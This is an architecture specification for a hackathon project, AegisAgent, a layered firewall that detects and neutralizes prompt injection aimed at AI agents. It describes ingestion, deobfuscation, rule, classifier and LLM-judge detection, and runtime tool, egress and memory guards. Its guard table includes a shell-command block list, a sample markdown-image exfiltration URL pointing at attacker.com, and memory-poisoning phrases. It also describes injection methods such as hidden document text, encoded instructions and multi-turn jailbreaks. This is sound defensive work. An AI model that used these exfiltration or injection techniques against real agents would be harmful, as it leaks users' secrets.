# AegisAgent Architecture & Technical Specification

A comprehensive technical architecture document for **AegisAgent: Prompt Injection Firewall**, built for the ET AI Hackathon (Problem 2: Agentic Cybersecurity).

---

## 1. System Overview & Core Philosophy

Prompt injection attacks occur when untrusted data is inadvertently parsed as execution instructions by an AI agent. AegisAgent solves this fundamental architectural vulnerability through a defense-in-depth model built on three foundational pillars:

1. **Instruction vs. Data Separation:** Untrusted inbound channels (email, web, PDF, API responses, etc.) must never carry authoritative execution directives to an agent.
2. **Offset-Preserving Neutralization:** Rather than indiscriminately blocking documents, AegisAgent maps transformed and decoded text spans back to the **original raw character coordinates**, redacting only the hostile payload and wrapping the safe content in a cryptographically random **nonce-delimited spotlighting envelope**.
3. **Runtime Blast Radius Guards (G1–G3):** Even if an evasion bypasses text detection, runtime guards intercept tool calls, egress responses, and memory writes to enforce least privilege and prevent data exfiltration.

```
 Inbound Content (11 sources)                       Agent Runtime
        │                                                 │
        ▼                                                 │
 [L1 Ingestion Engine]                                    │
   11 Format Adapters → Segments (visible/hidden/alt)     │
        ▼                                                 │
 [L2 Normalization & Deobfuscation]                       │
   MappedText Graph (original ↔ decoded character spans)  │
        ▼                                                 │
 [L3 Detection Cascade]                                   │
   ├─ L3a Rules (9 categories) + Instruction-in-Data      │
   ├─ L3b ML Classifier (TF-IDF sliding window)           │
   ├─ L3c Hardened LLM Judge (grey-zone arbitration)      │
   └─ L3d Session Tracker (multi-turn jailbreaks)         │
        ▼                                                 │
 [L4 Fusion & Policy Engine]                              │
   Noisy-OR Risk Scoring → ALLOW / SANITIZE / BLOCK       │
        ▼                                                 │
 [L5 Spotlighting Neutralizer]                            │
   Span redaction on ORIGINAL text + Nonce Envelope       │
        │                                                 │
        ▼                                                 ▼
   Safe Content ────────────────────────────────────► Victim Agent (ReAct)
                                                          │
          ┌───────────────────────────────────────────────┤
          ▼                       ▼                       ▼
    [G1 Tool Guard]         [G2 Egress Guard]       [G3 Memory Guard]
    Tiers & Taint Rules     Canary & Secret Mask    Context Poisoning
          │                       │                       │
          └───────────────────────┴───────────────────────┘
                                  │
                                  ▼
               Audit Logger + Metrics + Review Queue
```

---

## 2. Pipeline Layers (L1 – L5)

### L1: Ingestion Engine (`aegis/ingestion/`)
Extracts content across all 11 carriers into structured `Segment` objects:
- **Adapters:** `text`, `html`, `markdown`, `pdf`, `docx`, `email`, `api_json`, `ocr_text`, `source_code`, `image_ocr`, and unified `registry`.
- **Hidden Content Extraction:**
  - **PDF:** Extracts text coordinates, flags white-on-white text, tiny font sizes ($\le 2\text{pt}$), and document metadata annotations.
  - **DOCX:** Directly inspects WordprocessingML (`word/document.xml`, `word/comments.xml`, `docProps/core.xml`) via `lxml.etree` to detect `<w:vanish/>`, hidden runs, comments, and white fonts.
  - **HTML:** Detects `<style="display:none">`, `visibility:hidden`, zero-opacity, HTML comments, and off-screen coordinates.
  - **Email:** Parses multi-part MIME boundaries, hidden HTML payloads, and suspicious headers.
- **Safety Caps:** Prevents zip bombs by validating uncompressed size against `max_zip_uncompressed_bytes`, restricts recursion depth, and enforces 10 MB upload limits.

### L2: Normalization & Deobfuscation (`aegis/normalize/`)
- **`MappedText`:** Bidirectional character-level coordinate mapper. Maps decoded positions back to the original source text regardless of deletions, insertions, or substitutions.
- **Decoders:** Base64, Hexadecimal, ROT13, Leetspeak, Spaced text, Homoglyph normalization (NFKC + confusable map), Zero-Width space stripping, and Unicode tag codepoint cleaning.
- **Variant Generation:** Explores a breadth-first search graph of decoded transformations capped at depth $\le 3$ and $\le 12$ unique variants.

### L3: Detection Cascade (`aegis/detection/`)
1. **L3a Rules (`rules.py`, `patterns.py`):**
   - 9 attack categories: Instruction Override, Role Change, Secret Extraction, Tool Abuse, Credential Theft, Context Poisoning, Multi-Step Jailbreak, Encoded Instructions, and Indirect Prompt Injection.
   - Bounded, ReDoS-safe regex patterns with exact span localization.
   - `InstructionInDataDetector`: Flags imperative command verbs co-occurring with system/agent cues on untrusted carriers while distinguishing benign business language.
2. **L3b ML Classifier (`classifier.py`):**
   - TF-IDF char n-grams (3–5) with class-weighted Logistic Regression.
   - Sliding window scanner (400 chars, stride 200) localizing injection likelihood.
3. **L3c Hardened LLM Judge (`judge.py`):**
   - Invoked exclusively on grey-zone scores ($0.35 \le \text{risk} \le 0.75$).
   - Nonce-delimited XML envelope spotlighting with delimiter escape neutralizers (`<<<` $\rightarrow$ `«««`).
   - Strict Pydantic JSON validation; malformed replies treated as "no opinion".
   - Circuit breaker: trips after 3 consecutive failures, resets after 60s.
4. **L3d Session Tracker (`session.py`):**
   - Maintains rolling conversational context across session turns.
   - Detects staged multi-turn jailbreaks by concatenating recent turns ($t-3 \dots t$).

### L4: Fusion & Policy Engine (`aegis/policy/`)
- **Noisy-OR Risk Aggregation:** Blends detector scores with delivery channel risk multipliers (e.g. Email: $1.2\times$, API: $1.15\times$, User: $1.0\times$).
- **Policy Decision Matrix:**
  - $\text{risk} < \text{allow\_below}$ ($0.25$): **ALLOW**
  - $\text{risk} \ge \text{block\_at}$ ($0.85$): **BLOCK**
  - $\text{allow\_below} \le \text{risk} < \text{block\_at}$: **SANITIZE** (if spans localizable) or **BLOCK**
  - Ambiguous / High Risk in User Message: **ESCALATE**

### L5: Neutralizer (`aegis/neutralize/`)
- **Span Redaction:** Replaces hostile spans on the **original document text** with non-executable redaction markers (`[REDACTED: INSTRUCTION_OVERRIDE]`).
- **Spotlighting Nonce Envelope:** Wraps untrusted text in cryptographically unique nonce delimiters:
  ```markdown
  <<<UNTRUSTED_CONTENT id=d41d8cd98f00b204 source=pdf>>>
  Safe sanitized content here...
  <<<END_UNTRUSTED_CONTENT id=d41d8cd98f00b204>>>
  ```

---

## 3. Runtime Defense-in-Depth Guards (G1 – G3)

When novel, zero-day, or paraphrased injections evade text inspection, runtime guards restrict the blast radius:

```
                  ┌─────────────────────────────────────────┐
                  │          Agent Generates Action         │
                  └────────────────────┬────────────────────┘
                                       │
         ┌─────────────────────────────┼─────────────────────────────┐
         ▼                             ▼                             ▼
  [G1 Tool Guard]               [G2 Egress Guard]             [G3 Memory Guard]
  - Tier Permissions            - Canary Token Tracking       - Authority Spoofing
  - Untrusted Taint Rule        - Credential Pattern Mask     - Persistence Directives
  - Parameter Validation        - Markdown Exfil Blocking     - Context Poisoning
```

| Guard | Component | Enforcement Mechanism |
|---|---|---|
| **G1 Tool Guard** | `aegis/guard/tool_guard.py` | 5 Risk Tiers (`READ_PUBLIC`, `READ_SENSITIVE`, `WRITE_LOCAL`, `EGRESS`, `EXEC_DESTRUCTIVE`). Tainted sessions cannot call `EGRESS` or `EXEC_DESTRUCTIVE`. Email egress strictly limited to `@company.internal`. Shell execution (`| sh`, `rm -rf`, `curl`) blocked. SQL writes blocked without authorization. |
| **G2 Egress Guard** | `aegis/guard/egress.py` | Detects dynamic canary token exfiltration; masks AWS keys, JWTs, and passwords; monitors 4-gram system prompt leakage; blocks markdown image render exfiltration (`![exfil](https://attacker.com/leak?...)`). |
| **G3 Memory Guard** | `aegis/guard/memory.py` | Scans candidate agent persistent memory writes for authority spoofing ("admin authorized", "CFO memo") and persistence overrides ("from now on always remember"), sanitizing tokens before database storage. |

---

## 4. Model Usage Per Layer

In strict adherence to Section 0 Rule 2, AegisAgent never fakes model execution. If an API key or binary is missing, the system degrades gracefully and labels the state:

| Layer | Model / Backend | Environment Dependency | Fallback / Degraded Mode |
|---|---|---|---|
| **L1 OCR Ingestion** | Tesseract OCR engine via `pytesseract` | `tesseract` binary in host PATH | Degrades gracefully; reports `ocr_available: false` in `/api/health`. |
| **L3b ML Classifier** | TF-IDF char n-grams (3-5) + Logistic Regression | `scikit-learn`, `joblib` | Sliding-window scoring. Offline and fast ($< 15\text{ms}$). |
| **L3c LLM Judge** | Claude Haiku (`claude-haiku-4-5-20251001`) | `ANTHROPIC_API_KEY` | If offline, skips L3c; cascade falls back to rules with tightened threshold (`allow_below - 0.10`). |
| **Agent Sandbox** | Claude Sonnet (`claude-sonnet-5`) | `ANTHROPIC_API_KEY` | Offline deterministic ReAct engine clearly labeled **`MOCK (offline)`**. Zero simulated API calls. |
| **Red-Team Loop** | Claude Haiku / Heuristic Mutator | `ANTHROPIC_API_KEY` | Offline heuristic mutation engine generates evasive variants across categories. |

---

## 5. Fault Tolerance & Operational Resilience

- **Per-Layer Timeouts:** Wrapped in thread pools with hard timeouts:
  - Rules: 500 ms
  - Classifier: 1000 ms
  - LLM Judge: 8000 ms
  - OCR: 10000 ms
- **Circuit Breaker:** Judge trips to `OPEN` state after 3 consecutive failures, cooling down for 60 seconds before half-open retry.
- **Fail-Closed Guarantee:** If the rules engine itself crashes, untrusted channels fail closed to `BLOCK`, and user messages fail closed to `ESCALATE`.
- **Privacy-Preserving Audit Logging:** SQLite `audit_log` records SHA-256 hashes and redacted excerpts; raw data is never persisted unless `STORE_CONTENT=1`.
- **Human-in-the-Loop Feedback Loop:** User feedback enters `review_queue`. Approved items retrain the classifier with versioned artifacts (`classifier_v_*.joblib`).
